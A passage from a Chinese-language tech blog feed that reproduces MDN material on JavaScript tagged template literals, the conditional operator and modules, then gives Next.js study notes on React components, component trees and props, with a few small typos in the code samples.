language_">console</span>.<span class="title function_">log</span>(callHistory[<span class="number">0</span>] === callHistory[<span class="number">1</span>]); <span class="comment">// true; all evaluations of the same tagged literal would pass in the same strings array</span></span><br></pre></td></tr></table></figure>

<p>这允许标签函数以其第一个参数作为标识来缓存结果。为了进一步确保数组值不变，第一个参数及其 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%8E%9F%E5%A7%8B%E5%AD%97%E7%AC%A6%E4%B8%B2"><code>raw</code> 属性</a>都会被<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/isFrozen">冻结</a>，因此你将无法改变它们。</p>
<h3 id="原始字符串"><a href="#原始字符串" class="headerlink" title="原始字符串"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%8E%9F%E5%A7%8B%E5%AD%97%E7%AC%A6%E4%B8%B2">原始字符串</a></h3><p>在标签函数的第一个参数中，存在一个特殊的属性 <code>raw</code> ，我们可以通过它来访问模板字符串的原始字符串，而无需<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Grammar_and_types#%E5%9C%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%9A%84%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6">转义特殊字符</a>。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">tag</span>(<span class="params">strings</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(strings.<span class="property">raw</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tag<span class="string">`string text line 1 \n string text line 2`</span>;</span><br><span class="line"><span class="comment">// logs &quot;string text line 1 \n string text line 2&quot; ,</span></span><br><span class="line"><span class="comment">// including the two characters &#x27;\&#x27; and &#x27;n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>另外，使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/raw"><code>String.raw()</code></a> 方法创建原始字符串和使用默认模板函数和字符串连接创建是一样的。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="title class_">String</span>.<span class="property">raw</span><span class="string">`Hi\n<span class="subst">$&#123;<span class="number">2</span>+<span class="number">3</span>&#125;</span>!`</span>;</span><br><span class="line"><span class="comment">// &quot;Hi\\n5!&quot;</span></span><br><span class="line"></span><br><span class="line">str.<span class="property">length</span>;.</span><br><span class="line"><span class="comment">// 6</span></span><br><span class="line"></span><br><span class="line">str.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">join</span>(<span class="string">&#x27;,&#x27;</span>);.</span><br><span class="line"><span class="comment">// &quot;H,i,\\,n,5,!&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果字面量不包含任何转义序列，<code>String.raw</code> 函数就像一个“identity”标签。如果你想要一个始终像不带标签的字面量那样的实际标识标签，可以用自定义函数，将“cooked”（例如，经转义序列处理过的）字面量数组传递给 <code>String.raw</code>，将它们当成原始字符串。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">identity</span> = (<span class="params">strings, ...values</span>) =&gt;</span><br><span class="line">  <span class="title class_">String</span>.<span class="title function_">raw</span>(&#123; <span class="attr">raw</span>: strings &#125;, ...values);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(identity<span class="string">`Hi\n<span class="subst">$&#123;<span class="number">2</span> + <span class="number">3</span>&#125;</span>!`</span>);</span><br><span class="line"><span class="comment">// Hi</span></span><br><span class="line"><span class="comment">// 5!</span></span><br></pre></td></tr></table></figure>

<p>这对于许多工具来说很有用，它们要对以特定名称为标签的字面量作特殊处理。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">html</span> = (<span class="params">strings, ...values</span>) =&gt; <span class="title class_">String</span>.<span class="title function_">raw</span>(&#123; <span class="attr">raw</span>: strings &#125;, ...values);</span><br><span class="line"><span class="comment">// 一些格式化程序会将此字面量的内容格式化为 HTML</span></span><br><span class="line"><span class="keyword">const</span> doc = html`<span class="language-xml"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en-US&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span>`</span>;</span><br></pre></td></tr></table></figure>

<h3 id="带标签的模板字面量及转义序列"><a href="#带标签的模板字面量及转义序列" class="headerlink" title="带标签的模板字面量及转义序列"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%AD%97%E9%9D%A2%E9%87%8F%E5%8F%8A%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%97">带标签的模板字面量及转义序列</a></h3><p>在普通模板字面量中，字符串字面量中的转义序列都是允许的，任何其他格式不正确的转义序列都是语法错误，包括：</p>
<ul>
<li><code>\</code> 后跟 <code>0</code> 以外的任何十进制数字，或 <code>\0</code> 后跟一个十进制数字，例如 <code>\9</code> 和 <code>\07</code>（这是一种<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Deprecated_and_obsolete_features#%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%97">已弃用的语法</a>）</li>
<li><code>\x</code> 后跟两位以下十六进制数字，例如<code>\xz</code></li>
<li><code>\u</code> 后不跟 <code>&#123;</code>，并且后跟四个以下十六进制数字，例如 <code>\uz</code></li>
<li><code>\u&#123;&#125;</code> 包含无效的 Unicode 码点——包含一个非十六进制数字，或者它的值大于 10FFFF，例如 <code>\u&#123;110000&#125;</code> 和 <code>\u&#123;z&#125;</code></li>
</ul>
<p><strong>备注：</strong> <code>\</code> 后面跟着其他字符，虽然它们可能没有用，因为没有转义，但它们不是语法错误。</p>
<p>然而，这对于带标签的模板来说是有问题的，除了“cooked”字面量外，这些模板还可以访问原始字面量（转义序列按原样保留）。带标签的模板应该允许嵌入语言（例如 <a href="https://zh.wikipedia.org/wiki/%E9%A2%86%E5%9F%9F%E7%89%B9%E5%AE%9A%E8%AF%AD%E8%A8%80">DSL</a> 或 <a href="https://zh.wikipedia.org/wiki/LaTeX">LaTeX</a>），在这些语言里其他转义序列是常见的。因此，从带标签的模板中删除了转义序列诸多格式的语法限制。</p>
<p>不过，非法转义序列在“cooked”当中仍然会体现出来。它们将以 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/undefined"><code>undefined</code></a> 元素的形式存在于“cooked”数组之中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">latex</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">cooked</span>: str[<span class="number">0</span>], <span class="attr">raw</span>: str.<span class="property">raw</span>[<span class="number">0</span>] &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">latex<span class="string">`\unicode`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123; cooked: undefined, raw: &quot;\\unicode&quot; &#125;</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，这一转义序列限制只对带标签的模板字面量移除，而不包括不带标签的模板字面量：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> bad = <span class="string">`bad escape sequence: \unicode`</span>;</span><br></pre></td></tr></table></figure>

<h2 id="规范-1"><a href="#规范-1" class="headerlink" title="规范"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E8%A7%84%E8%8C%83">规范</a></h2><p>| Specification                                                |
| ———————————————————— |
| <a href="https://tc39.es/ecma262/multipage/ecmascript-language-expressions.html#sec-template-literals">ECMAScript Language Specification  # sec-template-literals</a> |</p>
<h1 id="条件（三元）运算符"><a href="#条件（三元）运算符" class="headerlink" title="条件（三元）运算符"></a>条件（三元）运算符</h1><p><strong>条件（三元）运算符</strong>是 JavaScript 唯一使用三个操作数的运算符：一个条件后跟一个问号（<code>?</code>），如果条件为<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Truthy">真值</a>，则执行冒号（<code>:</code>）前的表达式；若条件为<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Falsy">假值</a>，则执行最后的表达式。该运算符经常当作 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/if...else"><code>if...else</code></a> 语句的简捷形式来使用。</p>
<h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Conditional_Operator#%E8%AF%AD%E6%B3%95">语法</a></h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">condition ? exprIfTrue : exprIfFalse</span><br></pre></td></tr></table></figure>

<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Conditional_Operator#%E5%8F%82%E6%95%B0">参数</a></h3><ul>
<li><p><code>condition</code></p>
<p>​    计算结果用作条件的表达式。  </p>
</li>
<li><p><code>exprIfTrue</code></p>
<p>​    如果 <code>condition</code> 的计算结果为<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Truthy">真值</a>（等于或可以转换为 <code>true</code> 的值），则执行该表达式。  </p>
</li>
<li><p><code>exprIfFalse</code></p>
<p>​    如果 <code>condition</code> 为<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Falsy">假值</a>（等于或可以转换为 <code>false</code> 的值）时执行的表达式。</p>
</li>
</ul>
<h2 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Conditional_Operator#%E6%8F%8F%E8%BF%B0">描述</a></h2><p>除了 <code>false</code>，可能的假值表达式还有：<code>null</code>、<code>NaN</code>、<code>0</code>、空字符串（<code>&quot;&quot;</code>）和 <code>undefined</code>。如果 <code>condition</code> 是其中任何一个，那么条件表达式的结果就是 <code>exprIfFalse</code> 表达式执行的结果。</p>
<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Conditional_Operator#%E7%A4%BA%E4%BE%8B">示例</a></h2><h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Conditional_Operator#%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90">简单的例子</a></h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> age = <span class="number">26</span>;</span><br><span class="line"><span class="keyword">const</span> beverage = age &gt;= <span class="number">21</span> ? <span class="string">&quot;Beer&quot;</span> : <span class="string">&quot;Juice&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(beverage); <span class="comment">// &quot;Beer&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="处理-null-值"><a href="#处理-null-值" class="headerlink" title="处理 null 值"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Conditional_Operator#%E5%A4%84%E7%90%86_null_%E5%80%BC">处理 null 值</a></h3><p>一个常见的用法是处理可能为 <code>null</code> 的值：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">greeting</span> = (<span class="params">person</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> name = person ? person.<span class="property">name</span> : <span class="string">&quot;stranger&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`Howdy, <span class="subst">$&#123;name&#125;</span>`</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">greeting</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;Alice&quot;</span> &#125;)); <span class="comment">// &quot;Howdy, Alice&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">greeting</span>(<span class="literal">null</span>)); <span class="comment">// &quot;Howdy, stranger&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="条件链"><a href="#条件链" class="headerlink" title="条件链"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Conditional_Operator#%E6%9D%A1%E4%BB%B6%E9%93%BE">条件链</a></h3><p>三元运算符是右结合的，这意味着它可以按以下方式“链接”起来，类似于 <code>if … else if … else if … else</code> 链：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">example</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> condition1</span><br><span class="line">    ? value1</span><br><span class="line">    : condition2</span><br><span class="line">    ? value2</span><br><span class="line">    : condition3</span><br><span class="line">    ? value3</span><br><span class="line">    : value4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这等价于以下 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/if...else"><code>if...else</code></a> 链。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">example</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (condition1) &#123;</span><br><span class="line">    <span class="keyword">return</span> value1;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition2) &#123;</span><br><span class="line">    <span class="keyword">return</span> value2;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition3) &#123;</span><br><span class="line">    <span class="keyword">return</span> value3;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> value4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="规范-2"><a href="#规范-2" class="headerlink" title="规范"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Conditional_Operator#%E8%A7%84%E8%8C%83">规范</a></h2><p>| Specification                                                |
| ———————————————————— |
| <a href="https://tc39.es/ecma262/multipage/ecmascript-language-expressions.html#sec-conditional-operator">ECMAScript Language Specification  # sec-conditional-operator</a> |</p>
<h1 id="JavaScript-模块"><a href="#JavaScript-模块" class="headerlink" title="JavaScript 模块"></a>JavaScript 模块</h1><p>这篇指南会给你入门 JavaScript 模块的全部信息。</p>
<h2 id="模块化的背景"><a href="#模块化的背景" class="headerlink" title="模块化的背景"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Modules#%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E8%83%8C%E6%99%AF">模块化的背景</a></h2><p>JavaScript 程序本来很小——在早期，它们大多被用来执行独立的脚本任务，在你的 web 页面需要的地方提供一定交互，所以一般不需要多大的脚本。过了几年，我们现在有了运行大量 JavaScript 脚本的复杂程序，还有一些被用在其他环境（例如 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Node.js">Node.js</a>）。</p>
<p>因此，近年来，有必要开始考虑提供一种<strong>将 JavaScript 程序拆分为可按需导入的单独模块</strong>的机制。Node.js 已经提供这个能力很长时间了，还有很多的 JavaScript 库和框架已经开始了模块的使用（例如，<a href="https://en.wikipedia.org/wiki/CommonJS">CommonJS</a> 和基于 <a href="https://github.com/amdjs/amdjs-api/blob/master/AMD.md">AMD</a> 的其他模块系统 如 <a href="https://requirejs.org/">RequireJS</a>，以及最新的 <a href="https://webpack.github.io/">Webpack</a> 和 <a href="https://babeljs.io/">Babel</a>）。</p>
<p>好消息是，最新的浏览器开始原生支持模块功能了，这是本文要重点讲述的。这会是一个好事情 —- 浏览器能够最优化加载模块，使它比使用库更有效率：使用库通常需要做额外的客户端处理。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Next.js</tag>
        <tag>React</tag>
        <tag>jsx</tag>
      </tags>
  </entry>
  <entry>
    <title>Next学习手册（四）- React Core Concepts</title>
    <url>/2023/09/28/2023-9-28-Next%E5%AD%A6%E4%B9%A0%E6%89%8B%E5%86%8C%EF%BC%88%E5%9B%9B%EF%BC%89-%20React-Core-Concepts/</url>
    <content><![CDATA[<h2 id="React-Core-Concepts"><a href="#React-Core-Concepts" class="headerlink" title="React Core Concepts"></a>React Core Concepts</h2><p>React有三个核心概念，需要熟悉这三个核心概念来构建React 应用程序。</p>
<ul>
<li>Components：构建块</li>
<li>Props：支撑 &#x2F; 道具</li>
<li>State：状态</li>
</ul>
<h3 id="UI构建块"><a href="#UI构建块" class="headerlink" title="UI构建块"></a>UI构建块</h3><p>用户界面可以分解为称为组件的较小构建块。</p>
<p> 组件允许构建自包含的、可重用的代码片段。 </p>
<p>Next.js官方的比喻我认为很形象</p>
<ul>
<li>If you think of components as LEGO bricks, you can take these individual bricks and combine them together to form larger structures. If you need to update a piece of the UI, you can update the specific component or brick.<ul>
<li>如果你把组件想象成乐高积木，你可以把这些单独的积木组合在一起，形成更大的结构。如果需要更新UI的一部分，可以更新特定的组件或块。</li>
</ul>
</li>
</ul>
<p>优点：使代码更容易维护</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/components.png" class="">

<h3 id="Creating-components"><a href="#Creating-components" class="headerlink" title="Creating components"></a>Creating components</h3><p>在React中，组件就是函数， 在脚本标记中，编写一个名为header的函数： </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jsx&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">header</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>, app)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p> 组件是一个返回UI元素的函数。在函数的return语句中，可以编写JSX： </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jsx&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">header</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">     <span class="keyword">return</span> (<span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>)</span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(, app)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p> 要将此组件渲染到DOM，可以将其作为<code>ReactDOM.render()</code>方法中的第一个参数传递： </p>
<p> 但是，React组件应该大写，以区别于普通的HTML和JavaScript。 </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Capitalize the React Component</span></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="title class_">Header</span>, app);</span><br></pre></td></tr></table></figure>

<p> 其次，您使用React组件的方式与使用常规HTML标记的方式相同，带有尖括号&lt;&gt;。 </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用了 Header 组件</span></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span>, app);</span><br></pre></td></tr></table></figure>

<h3 id="Nesting-Components"><a href="#Nesting-Components" class="headerlink" title="Nesting Components"></a>Nesting Components</h3><p> 应用程序通常包含比单个组件更多的内容。您可以像普通HTML元素一样，将React组件嵌套在彼此内部。 </p>
<p>创建一个名为HomePage的新组件：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span>, app);</span><br></pre></td></tr></table></figure>

<p> 然后将<code>&lt;Header&gt;</code>组件嵌套在新的<code>&lt;HomePage&gt;</code>组件中： </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/*  嵌套Header组件 下面的Header引用自上方的 Header()  */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 但是这里的却不是用的 &lt;HomePage /&gt; o,下面就讲了</span></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span>, app);</span><br></pre></td></tr></table></figure>

<h3 id="Component-Trees"><a href="#Component-Trees" class="headerlink" title="Component Trees"></a>Component Trees</h3><p> 可以通过这种方式不断嵌套React组件以形成组件树。 </p>
<p>顶级主页组件可以包含页眉、文章和页脚组件。每个组件都可以有自己的子组件等等。例如，Header组件可以包含Logo、Title和Navigation组件。</p>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/component-tree.png" class="">

<p>这种模块化格式允许在应用程序的不同位置重用组件, 在的项目中，由于＜主页＞现在是您的顶级组件，您可以将其传递给<code>ReactDOM.render()</code>方法： </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">unction <span class="title class_">Header</span>() &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 顶级组件是 HomePage 传递的时候会自动带着下级组件</span></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">HomePage</span> /&gt;</span></span>, app);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Next.js</tag>
        <tag>React</tag>
        <tag>jsx</tag>
      </tags>
  </entry>
  <entry>
    <title>Next学习手册（五） - Props</title>
    <url>/2023/09/29/2023-9-29-Next%E5%AD%A6%E4%B9%A0%E6%89%8B%E5%86%8C%EF%BC%88%E4%BA%94%EF%BC%89-%20Props/</url>
    <content><![CDATA[<p> 到目前为止，如果要重用＜Header&#x2F;＞组件，它将两次显示相同的内容。 </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Header</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Develop. Preview. Ship. 🚀<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HomePage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 但是，如果你想传递不同的文本，或者因为从外部源获取数据而不提前知道信息，该怎么办？ </p>
<p> 常规HTML元素具有一些属性，您可以使用这些属性来传递更改这些元素行为的信息。例如，更改<code>&lt;img&gt;</code>元素的src属性会更改所显示的图像。更改<code>&lt;a&gt;</code>标记的href属性会更改链接的目的地。 </p>
<p> 以同样的方式，您可以将信息片段作为属性传递给React组件。这些被称为Props。 </p>
<p> 与JavaScript函数类似，您可以设计接受自定义参数（或道具）的组件，这些参数可以更改组件的行为或在屏幕上显示的内容。然后，您可以将这些道具从父组件传递到子组件。 </p>
<ul>
<li>注意：在React中，数据沿着组件树向下流动。这被称为单向数据流。状态（将在下一节中讨论）可以作为道具从父组件传递到子组件。</li>
</ul>
<img src="http://171.38.91.172:4666/MOON/blog%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/props.png" class="">

<h3 id="Using-props"><a href="#Using-props" class="headerlink" title="Using props"></a>Using props</h3><p>在HomePage组件中，可以将自定义标题道具传递给Header组件，就像传递HTML属性一样：</p>
